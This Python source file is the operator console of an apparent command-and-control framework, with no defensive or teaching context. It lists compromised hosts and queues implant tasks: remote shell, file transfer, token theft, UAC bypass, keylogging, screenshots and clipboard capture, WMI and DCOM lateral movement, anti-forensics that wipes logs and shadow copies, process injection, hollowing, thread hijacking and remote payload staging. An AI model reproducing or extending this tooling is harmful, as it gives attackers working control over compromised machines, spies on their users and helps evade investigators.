"""Operator console (prompt_toolkit)."""
from __future__ import annotations

import shlex
import threading
import time
from typing import Optional

from prompt_toolkit import PromptSession
from prompt_toolkit.completion import Completer, Completion
from prompt_toolkit.formatted_text import HTML
from prompt_toolkit.history import InMemoryHistory
from prompt_toolkit.patch_stdout import patch_stdout
from prompt_toolkit.shortcuts import radiolist_dialog
from prompt_toolkit.styles import Style

from .crypto import random_token
from .state import Agent, State

_COMMANDS = [
    "help",
    "agents",
    "use",
    "select",
    "interact",
    "shell",
    "upload",
    "download",
    "sleep",
    "rotate",
    "steal_token",
    "whoami",
    "uac_fodhelper",
    "uac_mockdir",
    "keylog",
    "screenshot",
    "clipboard",
    "smb_check",
    "wmi_exec",
    "dcom_trigger",
    "antiforensics",
    "remote_inject",
    "hollow",
    "hijack_thread",
    "stage",
    "upload-stage",
    "tasks",
    "results",
    "kill",
    "rm",
    "clear",
    "exit",
    "quit",
]

_STYLE = Style.from_dict(
    {
        "prompt": "bold #e8e6e3",
        "agent": "bold #7dba6f",
        "none": "#6b6b6b",
        "dialog": "bg:#1a1a1a",
        "dialog.body": "bg:#1a1a1a #e8e6e3",
        "dialog frame.label": "bold #e8e6e3",
        "dialog.body label": "#e8e6e3",
        "button": "bg:#2a2a2a",
        "button.focused": "bg:#7dba6f #111111",
        "radio": "#e8e6e3",
        "radio-selected": "bold #7dba6f",
        "radio-checked": "#7dba6f",
    }
)

_HELP = """
  use / agents     pick an agent (arrows + enter, or type a number)
  select <n|id>  set active agent by list number or id prefix
  shell <cmd>    run a command on the active agent
  whoami         implant identity
  sleep <sec>    change beacon interval
  tasks          pending / done tasks
  results        last results
  kill           tell active agent to exit
  rm <n|id>      drop agent from registry
  clear          clear screen
  exit           stop the server

  also: upload download rotate steal_token keylog screenshot clipboard
        smb_check wmi_exec dcom_trigger antiforensics remote_inject
        uac_fodhelper uac_mockdir hollow hijack_thread
        stage upload-stage
""".strip()


class _CmdCompleter(Completer):
    def __init__(self, cli: "OperatorCLI") -> None:
        self.cli = cli

    def get_completions(self, document, complete_event):
        text = document.text_before_cursor
        parts = text.split()
        if not parts or (len(parts) == 1 and not text.endswith(" ")):
            word = parts[0] if parts else ""
            for c in _COMMANDS:
                if c.startswith(word.lower()):
                    yield Completion(c, start_position=-len(word))
            return
        cmd = parts[0].lower()
        if cmd in ("select", "interact", "rm", "use") and (
            len(parts) == 1 or (len(parts) == 2 and not text.endswith(" "))
        ):
            prefix = parts[1] if len(parts) == 2 else ""
            for i, a in enumerate(self.cli.state.list_agents(), 1):
                label = f"{i}"
                if label.startswith(prefix) or a.agent_id.startswith(prefix):
                    yield Completion(
                        label,
                        start_position=-len(prefix),
                        display=f"{i}  {a.username}@{a.hostname}  {a.agent_id[:8]}",
                    )


class OperatorCLI:
    def __init__(
        self,
        state: State,
        stop_event: threading.Event,
        bind: str = "",
        psk: str = "",
    ) -> None:
        self.state = state
        self.stop = stop_event
        self.bind = bind
        self.psk = psk
        self.active_agent: Optional[str] = None
        self._session = PromptSession(
            history=InMemoryHistory(),
            completer=_CmdCompleter(self),
            style=_STYLE,
        )

    def run(self) -> None:
        self._banner()
        with patch_stdout():
            while not self.stop.is_set():
                try:
                    line = self._session.prompt(self._prompt_tokens()).strip()
                except (EOFError, KeyboardInterrupt):
                    print()
                    self.stop.set()
                    return
                if not line:
                    continue
                self._dispatch(line)

    def _banner(self) -> None:
        print()
        print("  c2")
        if self.bind:
            print(f"  {self.bind}")
        print("  use  — pick agent   |   help  — commands")
        print()

    def _prompt_tokens(self):
        if self.active_agent:
            a = self.state.get_agent(self.active_agent)
            if a:
                tag = f"{a.username}@{a.hostname}"
                return HTML(f"<prompt>c2</prompt> <agent>{tag}</agent>> ")
            return HTML(f"<prompt>c2</prompt>(<agent>{self.active_agent[:8]}</agent>)> ")
        return HTML("<prompt>c2</prompt> <none>-</none>> ")

    def _dispatch(self, line: str) -> None:
        try:
            parts = shlex.split(line)
        except ValueError as e:
            print(f"  {e}")
            return
        cmd, args = parts[0].lower(), parts[1:]
        aliases = {
            "interact": "select",
            "quit": "exit",
            "use": "agents",
            "ls": "agents",
            "i": "select",
            "upload-stage": "upload_stage",
        }
        cmd = aliases.get(cmd, cmd.replace("-", "_"))
        handler = getattr(self, f"cmd_{cmd}", None)
        if handler is None:
            print(f"  unknown: {cmd}")
            return
        try:
            handler(args)
        except Exception as e:  # noqa: BLE001
            print(f"  error: {e}")

    def _require_active(self) -> bool:
        if not self.active_agent or not self.state.get_agent(self.active_agent):
            print("  no agent selected — run: use")
            return False
        return True

    def _enqueue(self, cmd: str, args: list[str]) -> None:
        if not self._require_active():
            return
        task_id = random_token(6)
        self.state.enqueue(self.active_agent, task_id, cmd, args)
        print(f"  + {cmd}  {task_id}")

    def _resolve_agent(self, token: str) -> Optional[Agent]:
        agents = self.state.list_agents()
        if token.isdigit():
            n = int(token)
            if 1 <= n <= len(agents):
                return agents[n - 1]
        exact = self.state.get_agent(token)
        if exact:
            return exact
        matches = [a for a in agents if a.agent_id.startswith(token)]
        if len(matches) == 1:
            return matches[0]
        return None

    def _activate(self, agent: Agent) -> None:
        self.active_agent = agent.agent_id
        print(f"  -> {agent.username}@{agent.hostname}  ({agent.agent_id[:12]})")

    def _pick_agent_dialog(self, agents: list[Agent]) -> Optional[Agent]:
        values = [
            (a.agent_id, f"{i}.  {a.username}@{a.hostname}   {a.agent_id[:10]}   {a.stale_seconds:.0f}s")
            for i, a in enumerate(agents, 1)
        ]
        default = self.active_agent if self.active_agent in {a.agent_id for a in agents} else None
        try:
            chosen = radiolist_dialog(
                title="agents",
                text="select an agent  (arrows / enter, esc cancel)",
                values=values,
                default=default,
                style=_STYLE,
            ).run()
        except Exception:
            return None
        if not chosen:
            return None
        return self.state.get_agent(chosen)

    def cmd_help(self, _args: list[str]) -> None:
        print()
        print(_HELP)
        print()

    def cmd_clear(self, _args: list[str]) -> None:
        print("\033[2J\033[H", end="")
        self._banner()

    def cmd_agents(self, args: list[str]) -> None:
        agents = self.state.list_agents()
        if not agents:
            print("  no agents")
            return

        # `use` / bare `agents` opens the picker. `agents -` just lists.
        if args and args[0] in ("-", "list", "ls"):
            self._print_agent_table(agents)
            return

        if len(agents) == 1:
            self._activate(agents[0])
            return

        picked = self._pick_agent_dialog(agents)
        if picked:
            self._activate(picked)
        else:
            # Fallback if dialog unavailable (non-TTY): numbered list.
            self._print_agent_table(agents)
            print("  select <n>   or   select <id>")

    def _print_agent_table(self, agents: list[Agent]) -> None:
        print()
        print(f"  {'#':<4} {'user@host':<28} {'id':<12} {'seen':>6}")
        print(f"  {'-'*4} {'-'*28} {'-'*12} {'-'*6}")
        for i, a in enumerate(agents, 1):
            mark = "*" if a.agent_id == self.active_agent else " "
            who = f"{a.username}@{a.hostname}"
            print(f" {mark}{i:<3} {who:<28} {a.agent_id[:12]:<12} {a.stale_seconds:>5.0f}s")
        print()

    def cmd_select(self, args: list[str]) -> None:
        if not args:
            self.cmd_agents([])
            return
        agent = self._resolve_agent(args[0])
        if not agent:
            print(f"  no agent matching {args[0]!r}")
            return
        self._activate(agent)

    def cmd_shell(self, args: list[str]) -> None:
        if not args:
            print("  usage: shell <command...>")
            return
        self._enqueue("SHELL", args)

    def cmd_upload(self, args: list[str]) -> None:
        if len(args) != 2:
            print("  usage: upload <local> <remote>")
            return
        from pathlib import Path
        import base64

        local = Path(args[0])
        remote = args[1]
        if not local.is_file():
            print(f"  not found: {local}")
            return
        data = local.read_bytes()
        b64 = base64.b64encode(data).decode("ascii")
        # Agent expects: UPLOAD <remote_path> <base64>
        self._enqueue("UPLOAD", [remote, b64])
        print(f"  queued {len(data)} bytes -> {remote}")

    def cmd_download(self, args: list[str]) -> None:
        if len(args) != 1:
            print("  usage: download <remote>")
            return
        self._enqueue("DOWNLOAD", args)

    def cmd_sleep(self, args: list[str]) -> None:
        if len(args) != 1:
            print("  usage: sleep <seconds>")
            return
        self._enqueue("SLEEP", args)

    def cmd_rotate(self, _args: list[str]) -> None:
        self._enqueue("ROTATE_KEY", [])

    def cmd_steal_token(self, args: list[str]) -> None:
        if len(args) != 1:
            print("  usage: steal_token <pid>")
            return
        self._enqueue("STEAL_TOKEN", args)

    def cmd_whoami(self, _args: list[str]) -> None:
        self._enqueue("WHOAMI", [])

    def cmd_uac_fodhelper(self, _args: list[str]) -> None:
        self._enqueue("UAC_FODHELPER", [])

    def cmd_uac_mockdir(self, _args: list[str]) -> None:
        self._enqueue("UAC_MOCKDIR", [])

    def cmd_keylog(self, args: list[str]) -> None:
        if len(args) > 1:
            print("  usage: keylog [seconds]")
            return
        self._enqueue("KEYLOG", args if args else ["30"])

    def cmd_screenshot(self, _args: list[str]) -> None:
        self._enqueue("SCREENSHOT", [])

    def cmd_clipboard(self, _args: list[str]) -> None:
        self._enqueue("CLIPBOARD", [])

    def cmd_smb_check(self, args: list[str]) -> None:
        if len(args) != 2:
            print("  usage: smb_check <target> <share>")
            return
        self._enqueue("SMB_CHECK", args)

    def cmd_wmi_exec(self, args: list[str]) -> None:
        if len(args) < 2:
            print("  usage: wmi_exec <target> <command...>")
            return
        self._enqueue("WMI_EXEC", args)

    def cmd_dcom_trigger(self, args: list[str]) -> None:
        if len(args) != 1:
            print("  usage: dcom_trigger <target>")
            return
        self._enqueue("DCOM_TRIGGER", args)

    def cmd_antiforensics(self, args: list[str]) -> None:
        if any(a not in ("--vss", "--no-logs") for a in args):
            print("  usage: antiforensics [--vss] [--no-logs]")
            return
        self._enqueue("ANTIFORENSICS", args)

    def cmd_remote_inject(self, args: list[str]) -> None:
        if len(args) != 1:
            print("  usage: remote_inject <pid>")
            return
        self._enqueue("REMOTE_INJECT", args)

    def cmd_hollow(self, args: list[str]) -> None:
        if len(args) != 2:
            print("  usage: hollow <host_exe> <local_pe>")
            return
        from pathlib import Path
        import base64

        pe = Path(args[1])
        if not pe.is_file():
            print(f"  not found: {pe}")
            return
        b64 = base64.b64encode(pe.read_bytes()).decode("ascii")
        self._enqueue("HOLLOW", [args[0], b64])
        print(f"  queued hollow {pe.name} into {args[0]}")

    def cmd_hijack_thread(self, args: list[str]) -> None:
        if len(args) != 2:
            print("  usage: hijack_thread <pid> <local_payload>")
            return
        from pathlib import Path
        import base64

        path = Path(args[1])
        if not path.is_file():
            print(f"  not found: {path}")
            return
        b64 = base64.b64encode(path.read_bytes()).decode("ascii")
        self._enqueue("HIJACK_THREAD", [args[0], b64])
        print(f"  queued hijack into pid {args[0]}")

    def cmd_stage(self, args: list[str]) -> None:
        if not args:
            print("  usage: stage <url> [hex_key32]")
            return
        self._enqueue("STAGE", args)

    def cmd_upload_stage(self, args: list[str]) -> None:
        """Upload a raw payload to the teamserver stage store (not to an agent)."""
        if len(args) != 1:
            print("  usage: upload-stage <local_file>")
            return
        from pathlib import Path

        import urllib.request

        path = Path(args[0])
        if not path.is_file():
            print(f"  not found: {path}")
            return
        data = path.read_bytes()
        base = self.bind.rstrip("/") if self.bind else "http://127.0.0.1:8443"
        url = f"{base}/stage/upload"
        try:
            req = urllib.request.Request(url, data=data, method="POST")
            with urllib.request.urlopen(req, timeout=30) as resp:
                body = resp.read().decode("utf-8", errors="replace")
            print(f"  uploaded {len(data)} bytes -> {url}")
            print(f"  {body}")
            print(f"  agent: stage {base}/stage/payload")
        except Exception as e:
            print(f"  upload failed: {e}")

    def cmd_tasks(self, _args: list[str]) -> None:
        if not self._require_active():
            return
        tasks = self.state.list_tasks(self.active_agent)
        if not tasks:
            print("  no tasks")
            return
        print()
        for t in tasks:
            status = "done" if t.done else "wait"
            created = time.strftime("%H:%M:%S", time.localtime(t.created_at))
            print(f"  {t.task_id}  {t.cmd:<12} {status}  {created}")
        print()

    def cmd_results(self, _args: list[str]) -> None:
        if not self._require_active():
            return
        tasks = [t for t in self.state.list_tasks(self.active_agent) if t.done]
        if not tasks:
            print("  no results")
            return
        for t in tasks:
            print(f"\n  -- {t.task_id} {t.cmd} --")
            print(t.result)
        print()

    def cmd_kill(self, _args: list[str]) -> None:
        if not self._require_active():
            return
        self._enqueue("EXIT", [])
        print("  exit queued")
        self.active_agent = None

    def cmd_rm(self, args: list[str]) -> None:
        if not args:
            print("  usage: rm <n|id>")
            return
        agent = self._resolve_agent(args[0])
        if not agent:
            print(f"  no agent matching {args[0]!r}")
            return
        self.state.remove_agent(agent.agent_id)
        if self.active_agent == agent.agent_id:
            self.active_agent = None
        print(f"  removed {agent.agent_id[:12]}")

    def cmd_exit(self, _args: list[str]) -> None:
        self.stop.set()
        print("  bye")
